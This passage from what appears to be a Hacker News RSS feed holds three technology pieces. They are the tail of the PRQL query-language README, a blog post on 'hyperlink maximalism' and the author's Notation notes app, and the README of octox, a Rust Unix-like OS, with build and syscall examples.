<a href="https://github.com/PRQL/prql/graphs/contributors"><img src="https://camo.githubusercontent.com/efe23154c6fb42a3b0c2ce0c1f482b687ab7303567211d6f84d8e10a6cdc42f6/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f5052514c2f7072716c3f7374796c653d666f722d7468652d6261646765" alt="GitHub contributors" data-canonical-src="https://img.shields.io/github/contributors/PRQL/prql?style=for-the-badge"></a>
<a href="https://github.com/PRQL/prql/stargazers"><img src="https://camo.githubusercontent.com/aa2a20c1221a4e5148eef3102bb622d4bee6cd6b6df32e474f54adaaf016c927/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f5052514c2f7072716c3f7374796c653d666f722d7468652d6261646765" alt="Stars" data-canonical-src="https://img.shields.io/github/stars/PRQL/prql?style=for-the-badge"></a></p>
<p dir="auto"><strong>P</strong>ipelined <strong>R</strong>elational <strong>Q</strong>uery <strong>L</strong>anguage, pronounced "Prequel".</p>
<p dir="auto">PRQL is a modern language for transforming data ‚Äî a simple, powerful, pipelined
SQL replacement. Like SQL, it's readable, explicit and declarative. Unlike SQL,
it forms a logical pipeline of transformations, and supports abstractions such
as variables and functions. It can be used with any database that uses SQL,
since it compiles to SQL.</p>
<p dir="auto">PRQL can be as simple as:</p>
<div dir="auto" data-snippet-clipboard-copy-content="from tracks
filter artist == &quot;Bob Marley&quot;                 # Each line transforms the previous result
aggregate {                                   # `aggregate` reduces each column to a value
  plays    = sum plays,
  longest  = max length,
  shortest = min length,                      # Trailing commas are allowed
}"><pre><span>from </span>tracks
<span>filter </span>artist <span>==</span> <span><span>"</span>Bob Marley<span>"</span></span>                 # <span>Each</span> line transforms the previous result
<span>aggregate </span><span><span>{</span></span>                                   # <span>`aggregate`</span> reduces each column to a value
  plays    <span>=</span> sum plays<span><span>,</span></span>
  longest  <span>=</span> max length<span><span>,</span></span>
  shortest <span>=</span> min length<span><span>,</span></span>                      # <span>Trailing</span> commas are allowed
<span><span>}</span></span></pre></div>
<p dir="auto">Here's a fuller example of the language;</p>
<div dir="auto" data-snippet-clipboard-copy-content="from employees
filter start_date > @2021-01-01               # Clear date syntax
derive {                                      # `derive` adds columns / variables
  gross_salary = salary + (tax ?? 0),         # Terse coalesce
  gross_cost = gross_salary + benefits_cost,  # Variables can use other variables
}
filter gross_cost > 0
group {title, country} (                      # `group` runs a pipeline over each group
  aggregate {                                 # `aggregate` reduces each group to a value
    average gross_salary,
    sum_gross_cost = sum gross_cost,          # `=` sets a column name
  }
)
filter sum_gross_cost > 100_000               # `filter` replaces both of SQL's `WHERE` &amp; `HAVING`
derive id = f&quot;{title}_{country}&quot;              # F-strings like Python
derive country_code = s&quot;LEFT(country, 2)&quot;     # S-strings allow using SQL as an escape hatch
sort {sum_gross_cost, -country}               # `-country` means descending order
take 1..20                                    # Range expressions (also valid here as `take 20`)"><pre><span>from </span>employees
<span>filter </span>start_date <span>&gt;</span> @<span>2021</span><span>-</span><span>01</span><span>-</span><span>01</span>               # <span>Clear</span> date syntax
<span>derive </span><span><span>{</span></span>                                      # <span>`derive`</span> adds columns <span>/</span> variables
  gross_salary <span>=</span> salary <span>+</span> <span>(</span>tax <span>??</span> <span>0</span><span>)</span><span><span>,</span></span>         # <span>Terse</span> coalesce
  gross_cost <span>=</span> gross_salary <span>+</span> benefits_cost<span><span>,</span></span>  # <span>Variables</span> can use other variables
<span><span>}</span></span>
<span>filter </span>gross_cost <span>&gt;</span> <span>0</span>
<span>group </span><span><span>{</span></span>title<span><span>,</span></span> country<span><span>}</span></span> <span>(</span>                      # <span>`group`</span> runs a pipeline over each group
  aggregate <span><span>{</span></span>                                 # <span>`aggregate`</span> reduces each group to a value
    average gross_salary<span><span>,</span></span>
    sum_gross_cost <span>=</span> sum gross_cost<span><span>,</span></span>          # `<span>=</span>` sets a column name
  <span><span>}</span></span>
<span>)</span>
<span>filter </span>sum_gross_cost <span>&gt;</span> 100_000               # <span>`filter`</span> replaces both <span>of </span><span>SQL</span>'s <span>`WHERE`</span> <span>&amp;</span> <span>`HAVING`</span>
<span>derive </span>id <span>=</span> f<span><span>"</span>{title}_{country}<span>"</span></span>              # <span>F</span><span>-</span>strings like <span>Python</span>
<span>derive </span>country_code <span>=</span> s<span><span>"</span>LEFT(country, 2)<span>"</span></span>     # <span>S</span><span>-</span>strings allow using <span>SQL</span> <span>as </span>an escape hatch
<span>sort </span><span><span>{</span></span>sum_gross_cost<span><span>,</span></span> <span>-</span>country<span><span>}</span></span>               # `<span>-</span>country` means descending order
<span>take </span><span>1</span><span>..</span><span>20</span>                                    # <span>Range</span> expressions <span>(</span>also valid here <span>as </span>`take <span>20</span>`<span>)</span></pre></div>
<p dir="auto">For more on the language, more examples &amp; comparisons with SQL, visit
<a href="https://prql-lang.org/" rel="nofollow">prql-lang.org</a>. To experiment with PRQL in the browser, check out
<a href="https://prql-lang.org/playground" rel="nofollow">PRQL Playground</a>.</p>
<h2 tabindex="-1" dir="auto">Current Status - April 2023</h2>
<p dir="auto">PRQL is being actively developed by a growing community. It's ready to use by
the intrepid, either with our supported integrations, or within your own tools,
using one of our supported language bindings.</p>
<p dir="auto">PRQL still has some minor bugs and some missing features, and probably is only
ready to be rolled out to non-technical teams for fairly simple queries.</p>
<p dir="auto">Here's our current <a href="https://prql-lang.org/roadmap/" rel="nofollow">Roadmap</a> and our
<a href="https://github.com/PRQL/prql/milestones">Milestones.</a></p>
<p dir="auto">Our immediate focus for the code is on:</p>
<ul dir="auto">
<li>Building out the next few big features, including
<a href="https://github.com/PRQL/prql/pull/1964" data-hovercard-type="pull_request" data-hovercard-url="/PRQL/prql/pull/1964/hovercard">types</a> and
<a href="https://github.com/PRQL/prql/pull/2129" data-hovercard-type="pull_request" data-hovercard-url="/PRQL/prql/pull/2129/hovercard">modules</a>.</li>
<li>Ensuring our supported features feel extremely robust; resolving any
<a href="https://github.com/PRQL/prql/issues?q=is%3Aissue+is%3Aopen+label%3Abug+label%3Apriority">priority bugs</a>.</li>
</ul>
<p dir="auto">We're also spending time thinking about:</p>
<ul dir="auto">
<li>Making it really easy to start using PRQL. We're doing that by building
integrations with tools that folks already use; for example our VS Code
extension &amp; Jupyter integration. If there are tools you're familiar with that
you think would be open to integrating with PRQL, please let us know in an
issue.</li>
<li>Making it easier to contribute to the compiler. We have a wide group of
contributors to the project, but contributions to the compiler itself are
quite concentrated. We're keen to expand this;
<a href="https://github.com/PRQL/prql/issues/1840" data-hovercard-type="issue" data-hovercard-url="/PRQL/prql/issues/1840/hovercard">#1840</a> for feedback.</li>
</ul>
<h2 tabindex="-1" dir="auto">Get involved</h2>
<p dir="auto">To stay in touch with PRQL:</p>
<ul dir="auto">
<li>Follow us on <a href="https://twitter.com/prql_lang" rel="nofollow">Twitter</a></li>
<li>Join us on <a href="https://discord.gg/eQcfaCmsNc" rel="nofollow">Discord</a></li>
<li>Star this repo</li>
<li><a href="https://prql-lang.org/book/contributing/" rel="nofollow">Contribute</a> ‚Äî&nbsp;join us in building PRQL, through writing code
<a href="https://github.com/PRQL/prql/discussions">(send us your use-cases!)</a>, or
inspiring others to use it.</li>
<li>See the <a href="https://prql-lang.org/book/contributing/development.html" rel="nofollow">development</a> documentation for PRQL. It's easy to get
started ‚Äî the project can be built in a couple of commands, and we're a really
friendly community!</li>
</ul>
<h2 tabindex="-1" dir="auto">Explore</h2>
<ul dir="auto">
<li><a href="https://prql-lang.org/playground" rel="nofollow">PRQL Playground</a> ‚Äî&nbsp;experiment with PRQL in the browser.</li>
<li><a href="https://prql-lang.org/book" rel="nofollow">PRQL Book</a> ‚Äî the language documentation.</li>
<li><a href="https://github.com/prql/dbt-prql">dbt-prql</a> ‚Äî write PRQL in dbt models.</li>
<li><a href="https://pyprql.readthedocs.io/en/latest/magic_readme.html" rel="nofollow">Jupyter magic</a> ‚Äî
run PRQL in Jupyter, either against a DB, or a Pandas DataFrame / CSV /
Parquet file through DuckDB.</li>
<li><a href="https://pyprql.readthedocs.io/" rel="nofollow">pyprql Docs</a> ‚Äî the pyprql documentation, the
Python bindings to PRQL, including Jupyter magic.</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=prql-lang.prql-vscode" rel="nofollow">PRQL VS Code extension</a></li>
<li><a href="https://www.npmjs.com/package/prql-js" rel="nofollow">prql-js</a> ‚Äî&nbsp;JavaScript bindings for
PRQL.</li>
</ul>
<h2 tabindex="-1" dir="auto">Repo organization</h2>
<p dir="auto">This repo is composed of:</p>
<ul dir="auto">
<li><strong><a href="https://github.com/PRQL/prql/blob/main/crates/prql-compiler">prql-compiler</a></strong> ‚Äî the compiler, written in rust,
whose main role is to compile PRQL into SQL. It also includes
<a href="https://github.com/PRQL/prql/blob/main/crates/prqlc">prqlc</a>, the CLI.</li>
<li><strong><a href="https://github.com/PRQL/prql/blob/main/web">web</a></strong> ‚Äî our web content: the <a href="https://prql-lang.org/book" rel="nofollow">Book</a>,
<a href="https://prql-lang.org/" rel="nofollow">Website</a>, and <a href="https://prql-lang.org/playground" rel="nofollow">Playground</a>.</li>
<li><strong><a href="https://github.com/PRQL/prql/blob/main/bindings">bindings</a></strong> ‚Äî bindings from various languages to
<code>prql-compiler</code>.</li>
</ul>
<p dir="auto">It also contains our testing / CI infrastructure and development tools. Check
out our <a href="https://prql-lang.org/book/contributing/development.html" rel="nofollow">development docs</a> for more details.</p>
<h2 tabindex="-1" dir="auto">Contributors</h2>
<p dir="auto">Many thanks to those who've made our progress possible:</p>
<p dir="auto"><a href="https://github.com/PRQL/prql/graphs/contributors"><img src="https://camo.githubusercontent.com/c4ec6198e5445cfa52d83958a5d1be5fbd83409a2cdebb3bb7d1ad180cd053a2/68747470733a2f2f636f6e747269622e726f636b732f696d6167653f7265706f3d5052514c2f7072716c" alt="Contributors" data-canonical-src="https://contrib.rocks/image?repo=PRQL/prql"></a></p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hyperlink maximalism (2022) (103 pts)]]></title>
            <link>https://thesephist.com/posts/hyperlink/</link>
            <guid>36866242</guid>
            <pubDate>Tue, 25 Jul 2023 17:40:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thesephist.com/posts/hyperlink/">https://thesephist.com/posts/hyperlink/</a>, See on <a href="https://news.ycombinator.com/item?id=36866242">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        <p>I‚Äôm a hyperlink maximalist: <strong>everything should be a hyperlink</strong>, including everything that is hyperlinked by the author, everything that isn‚Äôt hyperlinked by the author, and perhaps even the hyperlinks themselves. Words should be hyperlinked, but so should be every interesting phrase, quote, name, proper noun, paragraph, document, and collection of documents I read.</p>
<p>There are two obvious problems with this idea:</p>
<ol>
<li>No author has time to hyperlink infinite permutations of everything they write, and</li>
<li>If everything is hyperlinked, nobody will know which links are useful.</li>
</ol>
<p>But we can solve both of these issues if we simply <strong>begin with today‚Äôs lightly hyperlinked documents, and let the reader‚Äôs computer generate links on-demand.</strong> When I‚Äôm reading something and don‚Äôt understand a particular word or want to know more about a quote, <strong>when I select it, my computer should search across everything I‚Äôve read and some small high-quality subset of the Web to bring me 5-10 links</strong> about what I‚Äôve highlighted that are the most relevant to what I‚Äôm reading now. Boom. Everything is a hyperlink, and each link reveals to me new and interesting connections between <a href="https://thesephist.com/posts/infinite/">the finite knowledge I have and the infinite expanse of information on the web</a>.</p>
<p>This raises a third issue: How would I, the reader, know which words or ideas are interesting to click on?</p>
<p>That, too, can be solved similarly. <strong>The computer can look at every word on the page, every phrase, name, quote, and section of text, and show me a ‚Äúmap‚Äù of the words and ideas behind which lay the most interesting ideas I might want to know about.</strong> In this vision, links are no longer lonesome strands precariously holding together a sparsely connected Web, but a booming choir of connections tightly binding together everything I have read and I will read. From explorers walking across unknown terrain guided only by the occasional blue underlined text, we become master cartographers, with every path and trail between our ideas charted out in front of us.</p>
<p>This is not to say that automatically generated links will replace hyperlinks authors and note-takers like to use today, or even that we should try to replace and deprecate manually-placed hyperlinks. Rather, automatic links can complement manually-annotated links with something that scales faster and easier, so in a world where links can be automatically created, most links will be machine-made.</p>
<p>This vision of a knowledge tool with ‚Äúeverything as a link‚Äù really appealed to me when I was building myself a new app for my personal notes earlier this year, so I sought out to prototype a basic tool that would try to achieve some of what I speculated on above: begin with basic, conventional text documents, generate links ‚Äúon the fly‚Äù between my ideas, and visualize a map of such links and connections across my knowledge base.</p>
<p>The result is an app that I named <em>Notation</em>. It‚Äôs where my personal notes have lived since the start of the year, and while it‚Äôs not very feature-rich, I think it‚Äôs an interesting demonstration of some of the ideas of hyperlink maximalism.</p>
<h2 id="_notation_-a-prototype"><em>Notation</em>, a prototype</h2>
<p>At first glance, Notation is just another notes app with nested lists as the basic structure for information. Everything in Notation lives in a single, giant bulleted list, and each bullet can contain sub-bullets that open up when you toggle the bullet by clicking on it or hitting <em>Ctrl + Enter</em>.</p>
<p>Here‚Äôs a page of my own notes on <a href="https://numinous.productions/ttft/">Andy and Michael‚Äôs excellent essay on tools for thought</a>:</p>
<p><img src="https://thesephist.com/img/notation-highlights.png" alt="A screenshot of Notation, with bulleted lists of text. Some words are highlighted in varying shades of gray."></p>
<p>You‚Äôll notice that some text on the page is highlighted in shades of gray. This layer of highlight is what I call the ‚Äúheatmap‚Äù. It‚Äôs a heatmap of connections between notes that exist behind each word, because in Notation, every word and phrase is a link. To access any word or phrase as a link, you simply highlight it, and a popup will show <strong>all the places where I‚Äôve mentioned that idea, sorted so the mentions that share the most similar contexts to my current view are at the top</strong>.</p>
<p><img src="https://thesephist.com/img/notation-demo.gif" alt=""></p>
<p>That‚Äôs really all there is to Notation. It lets me treat my notes as if every idea is linked to every other mention of that idea, without ever manually linking anything. The heatmap highlights let me know which words I should try highlighting to see the most relevant and interesting connections between the idea in front of me and the rest of my notes.</p>
<p>These highlights can, as an example, show me when I‚Äôve mentioned a person‚Äôs name in many different places.</p>
<p><img src="https://thesephist.com/img/notation-andy-matuschak.png" alt=""></p>
<p>It can also pick up on common phrases like ‚Äúspaced repetition‚Äù or proper nouns like ‚ÄúQuantum Country‚Äù without any kind of prior knowledge or training (though both would probably help, the current version doesn‚Äôt use either). If these phrases end up being important ideas in my notes, they‚Äôll become more and more highlighted over time.</p>
<p><img src="https://thesephist.com/img/notation-phrases.png" alt=""></p>
<p>It can help me notice connections between ideas in my notes that I wouldn‚Äôt have even thought to make myself, even if I were trying to find interesting notes to link together. For example, here, within my list of software without <a href="https://szymonkaliski.com/notes/orientation-in-fractal-software/">fractal interfaces</a>, Notation highlighted the word ‚Äúspreadsheets‚Äù and connected it to how most users of spreadsheets use it for visual organization, not calculation. It‚Äôs an important insight ‚Äì interfaces can have useful spatial layouts without being fractal ‚Äì and I may have missed it, if I had depended on my own memory.</p>
<p><img src="https://thesephist.com/img/notation-spreadsheets.png" alt=""></p>
<p>In this next instance, rather than finding distant connections, highlights on the phrase ‚Äúperipheral vision‚Äù surfaced all the different authors who have mentioned it, signaling its importance across different streams of work.</p>
<p><img src="https://thesephist.com/img/notation-peripheral-vision.png" alt=""></p>
<p>Lastly, in this screenshot, Notation helps me see that both intelligence and expressiveness in an information medium may be emergent properties of their respective systems.</p>
<p><img src="https://thesephist.com/img/notation-emergent-property.png" alt=""></p>
<p>To produce these highlights and heatmaps, Notation currently uses a very simple algorithm for finding ideas that share similar context: two bullet points are similar if they share many <a href="https://en.wikipedia.org/wiki/N-gram">n-grams</a>. This is so computationally efficient that Notation can currently run everything in-browser, highlighting and generating heatmaps as you type. There are many ways to make this much smarter, such as by using sentence embeddings from language models to determine text similarity, but as a proof-of-concept of the core interface ideas behind highlights and text heatmaps, Notation has already proven quite useful in my personal use.</p>
<h3 id="the-demo">The demo</h3>
<p>If you want to try the interface for yourself, you can find a <a href="https://notation.app/">public deployment of Notation at notation.app</a>, initialized with a small subset of my personal notes from this year. By zooming into any particular page with <em>Control + Shift + Enter</em>, you can start exploring my notes using highlights and heatmaps on your own.</p>
<p>There‚Äôs one caveat: Notation was initially created just for myself, so keyboard shortcuts are essential to getting around. Here are the basics:</p>
<pre tabindex="0"><code>=== Notation demo TL;DR ===

Ctrl/Cmd Enter        Expand/collapse bullet
Ctrl/Cmd Shift Enter  Zoom into a bullet

Ctrl/Cmd P            Search
Ctrl/Cmd Shift P      Command bar
Ctrl/Cmd Shift I      New note (top-level bullet)

Ctrl/Cmd ;            Select last word
Ctrl/Cmd '            Select current bullet
</code></pre><h2 id="the-possibilities">The possibilities</h2>
<p>Notation in its current form does one thing pretty well ‚Äì helping me stumble into connections between my own notes. This has already been so useful to me that I found myself writing down thoughts I don‚Äôt even care to remember in Notation, because writing it into Notation will surface connections and links that I wouldn‚Äôt have remembered myself. But it should come as no surprise that this basic interface idea can be taken much farther.</p>
<p>The first natural extension of Notation is to expand the search scope of its connection-finding beyond my notes, to things like <a href="https://thesephist.com/posts/monocle/">my web-browsing history or my journals</a>. With a smarter system, a similar interface could even automatically discover and show links from your notes to high-quality articles or online sources that you may not have seen yet, automatically crawling the web on your behalf.</p>
<p>Another direction of exploration may be to use generative language models to automatically recombine and synthesize new ideas from my existing notes. In my past experiments with tools that automatically generated new content, I always found it annoying to have to read and trudge my way through information of uncertain value that I didn‚Äôt write. But a heatmap highlight interface similar to Notation‚Äôs could make it more practical for AI systems to ‚Äúbrainstorm‚Äù large amounts of creative explorations when we aren‚Äôt looking, because it would only surface when we clicked on a highlight, letting users discover automatically generated ideas at the right time, when they are most relevant.</p>
<p>Notation‚Äôs interface is one small attempt to <a href="https://thesephist.com/posts/nav/">approach and improve thinking as a navigation problem</a>. Highlights and heatmaps drawn by Notation from its understanding of language help us find interesting connections between ideas where we may have remembered none by ourselves, and it turns ideas written down in text form into a kind of a literal ‚Äúmap‚Äù. When combined with <a href="https://thesephist.com/posts/latent/">powerful new techniques in NLP</a>, I think interfaces like this can turn computers into powerful creative collaborators in our attempts to understand the world more deeply.</p>

        <hr>
        <p>
            
            ‚Üê
            <a href="https://thesephist.com/posts/infinite/"><em>Knowledge tools, finite and infinite</em></a>
            
        </p>
        <p>
            
            <a href="https://thesephist.com/posts/materials/"><em>Design with materials, not features</em></a>
            ‚Üí
            
        </p>
        <p>
            I share new posts on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this one, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#get-in-touch">email me.</a></p>
    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Octox: Unix-like OS in Rust inspired by xv6-riscv (157 pts)]]></title>
            <link>https://github.com/o8vm/octox</link>
            <guid>36865682</guid>
            <pubDate>Tue, 25 Jul 2023 17:10:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/o8vm/octox">https://github.com/o8vm/octox</a>, See on <a href="https://news.ycombinator.com/item?id=36865682">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">octox</h2>
<p dir="auto">octox is a Unix-like operating system inspired by xv6-riscv. octox loosely
  follows the structure and style of xv6, but is implemented in pure Rust.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1aa9584e6c812c231ad6aeb525954b1afff7ac723b40f65f096566a634e00a1f/68747470733a2f2f7668732e636861726d2e73682f7668732d364d51424979416f33447042724152427848784c33352e676966"><img src="https://camo.githubusercontent.com/1aa9584e6c812c231ad6aeb525954b1afff7ac723b40f65f096566a634e00a1f/68747470733a2f2f7668732e636861726d2e73682f7668732d364d51424979416f33447042724152427848784c33352e676966" alt="https://vhs.charm.sh/vhs-6MQBIyAo3DpBrARBxHxL35.gif" data-animated-image="" data-canonical-src="https://vhs.charm.sh/vhs-6MQBIyAo3DpBrARBxHxL35.gif"></a></p>
<ul dir="auto">
  <li>Everything from kernel, userland, mkfs, to build system is written in safe
    Rust as much as possible.</li>
  <li>There are no dependencies on external crates.</li>
  <li>The userland has a library similar to Rust‚Äôs std with K&amp;R malloc.</li>
  <li>Multi-core support, buddy allocator as kernel-side memory allocator, file
    system with logging support, etc.</li>
</ul>
<h2 tabindex="-1" dir="auto">Getting Started</h2>
<h2 tabindex="-1" dir="auto">Requirements</h2>
<ul dir="auto">
  <li>Install the rust toolchain to have cargo installed by following
    <a href="https://www.rust-lang.org/tools/install" rel="nofollow">this</a> guide.</li>
  <li>Install <code>qemu-system-riscv</code></li>
  <li>(option) Install <code>gdb-multiarch</code></li>
</ul>
<h2 tabindex="-1" dir="auto">Build and Run</h2>
<ul dir="auto">
  <li>Clone this project &amp; enter: <code>git clone ... &amp;&amp; cd octox</code></li>
  <li>Build: <code>cargo build --target riscv64gc-unknown-none-elf</code>.</li>
  <li>Run: <code>cargo run --target riscv64gc-unknown-none-elf</code>, then qemu will boot
    octox. To exit, press <code>Ctrl+a</code> and <code>x</code>.</li>
</ul>
<h2 tabindex="-1" dir="auto">Play with the Shell</h2>
<p dir="auto">A very simple shell is implemented.
  In addition to executing commands, you can only do the following things.</p>
<ul dir="auto">
  <li>Pipe: <code>cat file | head | grep test</code></li>
  <li>Dump processes: <code>Ctrl + P</code></li>
  <li>End of line: <code>Ctrl + D</code></li>
  <li>Redirect output: <code>&gt;</code>, <code>&gt;&gt;</code></li>
</ul>
<h2 tabindex="-1" dir="auto">Development</h2>
<h2 tabindex="-1" dir="auto">Userland Application</h2>
<p dir="auto">The userland comes with a user library called ulib that is similar to Rust‚Äôs
  std, so you can use it to develop your favorite commands. If you create a bin
  crate named <code>_command</code> in src/user, the build.rs and mkfs.rs will place a file
  named <code>command</code> in the file system and make it available for use.</p>
<ul dir="auto">
  <li>In src/user/Cargo.toml, define a bin crate with the name of the command you
    want to create with a <code>_</code> prefix
    <div dir="auto" data-snippet-clipboard-copy-content="[[bin]]
name = &quot;_rm&quot;
path = &quot;rm.rs&quot;
    "><pre>[[<span>bin</span>]]
<span>name</span> = <span><span>"</span>_rm<span>"</span></span>
<span>path</span> = <span><span>"</span>rm.rs<span>"</span></span>
    </pre></div>
  </li>
  <li>userland is also no_std, so don‚Äôt forget to add <code>#[no_std]</code>. Use ulib to
    develop any command you like. Here is an example of the rm command.
    <div dir="auto" data-snippet-clipboard-copy-content="#![no_std]
use ulib::{env, fs};

fn main() {
    let mut args = env::args().skip(1).peekable();

    if args.peek().is_none() {
        panic!(&quot;Usage: rm files...&quot;)
    }
    for arg in args {
        fs::remove_file(arg).unwrap()
    }
}
    "><pre><span>#!<span>[</span>no_std<span>]</span></span>
<span>use</span> ulib<span>::</span><span>{</span>env<span>,</span> fs<span>}</span><span>;</span>

<span>fn</span> <span>main</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> <span>mut</span> args = env<span>::</span><span>args</span><span>(</span><span>)</span><span>.</span><span>skip</span><span>(</span><span>1</span><span>)</span><span>.</span><span>peekable</span><span>(</span><span>)</span><span>;</span>

    <span>if</span> args<span>.</span><span>peek</span><span>(</span><span>)</span><span>.</span><span>is_none</span><span>(</span><span>)</span> <span>{</span>
        <span>panic</span><span>!</span><span>(</span><span>"Usage: rm files..."</span><span>)</span>
    <span>}</span>
    <span>for</span> arg <span>in</span> args <span>{</span>
        fs<span>::</span><span>remove_file</span><span>(</span>arg<span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span>
    <span>}</span>
<span>}</span>
    </pre></div>
  </li>
  <li>Then, <code>cargo run --target riscv64gc-unknown-none-elf</code> in the root of octox.</li>
  <li>To use <code>Vec</code> and <code>String</code>, etc, do the following:
    <div dir="auto" data-snippet-clipboard-copy-content="extern crate alloc;
use alloc::{string::String, vec::Vec};
    "><pre><span>extern</span> <span>crate</span> alloc<span>;</span>
<span>use</span> alloc<span>::</span><span>{</span>string<span>::</span><span>String</span><span>,</span> vec<span>::</span><span>Vec</span><span>}</span><span>;</span>
    </pre></div>
  </li>
</ul>
<h2 tabindex="-1" dir="auto">Kernel</h2>
<p dir="auto">Developing in src/kernel. Here is an example of adding a system call. If you
  want to add a new system call, you only need to add a definition to the system
  call table in libkernel, and the userland library will be automatically
  generated by build.rs.</p>
<ul dir="auto">
  <li>Add a variant and Syscall Number to <code>enum SysCalls</code> in src/kernel/syscall.rs.
    Here is <code>Dup2</code> as an example:
    <div dir="auto" data-snippet-clipboard-copy-content="pub enum SysCalls {
    Fork = 1,
    ...,
    Dup2 = 23,
    Invalid = 0,
}
    "><pre><span>pub</span> <span>enum</span> <span>SysCalls</span> <span>{</span>
    <span>Fork</span> = <span>1</span><span>,</span>
    ...<span>,</span>
    <span>Dup2</span> = <span>23</span><span>,</span>
    <span>Invalid</span> = <span>0</span><span>,</span>
<span>}</span>
    </pre></div>
  </li>
  <li>Define the function signature of the system call in the <code>TABLE</code> of
    <code>SysCalls</code>. Use the enum type <code>Fn</code> to describe the return type(<code>U</code> (Unit),
    <code>I</code> (Integer), <code>N</code> (never)) and use <code>&amp;str</code> to represent arguments. then,
    define kernel-side implementation as a method on <code>SysCalls</code>. <code>cfg</code> flag is
    used to control the compilation target for kernel and the rest. Here is an
    example of <code>dup2</code>:
    <div dir="auto" data-snippet-clipboard-copy-content="impl SysCalls {
    pub const TABLE: [(fn, &amp;'static str); variant_count::<Self>()] = [
        (Fn::N(Self::Invalid), &quot;&quot;),
        (Fn::I(Self::fork), &quot;()&quot;),
        (Fn::N(Self::exit), &quot;(xstatus: i32)&quot;),
        ...,
        (Fn::I(Self::dup2), &quot;(src: usize, dst: usize)&quot;),
    ];
    pub fn dup2() -> Result<usize> {
        #[cfg(not(all(target_os = &quot;none&quot;, feature = &quot;kernel&quot;)))]
        return Ok(0);
        #[cfg(all(target_os = &quot;none&quot;, feature = &quot;kernel&quot;))]
        {
            let p = Cpus::myproc().unwrap().data_mut();
            let src_fd = argraw(0); let dst_fd = argraw(1);
            if src_fd != dst_fd {
                let mut src = p.ofile.get_mut(src_fd).unwrap()
                    .take().unwrap();
                src.clear_cloexec();
                p.ofile.get_mut(dst_fd)
                    .ok_or(FileDescriptorTooLarge)?.replace(src);
            }
            Ok(dst_fd)
        }
    }
    "><pre><span>impl</span> <span>SysCalls</span> <span>{</span>
    <span>pub</span> <span>const</span> <span>TABLE</span><span>:</span> <span>[</span><span>(</span><span>fn</span><span>,</span> <span>&amp;</span><span>'</span><span>static</span> <span>str</span><span>)</span><span>;</span> <span>variant_count</span><span>::</span><span>&lt;</span><span>Self</span><span>&gt;</span><span>(</span><span>)</span><span>]</span> = <span>[</span>
        <span>(</span><span>Fn</span><span>::</span><span>N</span><span>(</span><span>Self</span><span>::</span><span>Invalid</span><span>)</span><span>,</span> <span>""</span><span>)</span><span>,</span>
        <span>(</span><span>Fn</span><span>::</span><span>I</span><span>(</span><span>Self</span><span>::</span>fork<span>)</span><span>,</span> <span>"()"</span><span>)</span><span>,</span>
        <span>(</span><span>Fn</span><span>::</span><span>N</span><span>(</span><span>Self</span><span>::</span>exit<span>)</span><span>,</span> <span>"(xstatus: i32)"</span><span>)</span><span>,</span>
        ..<span>.</span><span>,</span>
        <span>(</span><span>Fn</span><span>::</span><span>I</span><span>(</span><span>Self</span><span>::</span>dup2<span>)</span><span>,</span> <span>"(src: usize, dst: usize)"</span><span>)</span><span>,</span>
    <span>]</span><span>;</span>
    <span>pub</span> <span>fn</span> <span>dup2</span><span>(</span><span>)</span> -&gt; <span>Result</span><span>&lt;</span><span>usize</span><span>&gt;</span> <span>{</span>
        <span>#<span>[</span>cfg<span>(</span>not<span>(</span>all<span>(</span>target_os = <span>"none"</span><span>,</span> feature = <span>"kernel"</span><span>)</span><span>)</span><span>)</span><span>]</span></span>
        <span>return</span> <span>Ok</span><span>(</span><span>0</span><span>)</span><span>;</span>
        <span>#<span>[</span>cfg<span>(</span>all<span>(</span>target_os = <span>"none"</span><span>,</span> feature = <span>"kernel"</span><span>)</span><span>)</span><span>]</span></span>
        <span>{</span>
            <span>let</span> p = <span>Cpus</span><span>::</span><span>myproc</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>.</span><span>data_mut</span><span>(</span><span>)</span><span>;</span>
            <span>let</span> src_fd = <span>argraw</span><span>(</span><span>0</span><span>)</span><span>;</span> <span>let</span> dst_fd = <span>argraw</span><span>(</span><span>1</span><span>)</span><span>;</span>
            <span>if</span> src_fd != dst_fd <span>{</span>
                <span>let</span> <span>mut</span> src = p<span>.</span><span>ofile</span><span>.</span><span>get_mut</span><span>(</span>src_fd<span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span>
                    <span>.</span><span>take</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span>
                src<span>.</span><span>clear_cloexec</span><span>(</span><span>)</span><span>;</span>
                p<span>.</span><span>ofile</span><span>.</span><span>get_mut</span><span>(</span>dst_fd<span>)</span>
                    <span>.</span><span>ok_or</span><span>(</span><span>FileDescriptorTooLarge</span><span>)</span>?<span>.</span><span>replace</span><span>(</span>src<span>)</span><span>;</span>
            <span>}</span>
            <span>Ok</span><span>(</span>dst_fd<span>)</span>
        <span>}</span>
    <span>}</span><span></span>
    </pre></div>
  </li>
  <li>With just these steps, the dup2 system call is implemented in both kernel and
    userland.</li>
</ul>
<h2 tabindex="-1" dir="auto">License</h2>
<p dir="auto">Licensed under either of</p>
<ul dir="auto">
  <li><a href="http://www.apache.org/licenses/LICENSE-2.0" rel="nofollow">Apache License, Version 2.0</a></li>
  <li><a href="http://opensource.org/licenses/MIT" rel="nofollow">MIT license</a></li>
</ul>
<p dir="auto">at your option.</p>
<h2 tabindex="-1" dir="auto">Acknowledgments</h2>
<p dir="auto">octox is inspired by <a href="https://github.com/mit-pdos/xv6-riscv">xv6-riscv</a>.</p>
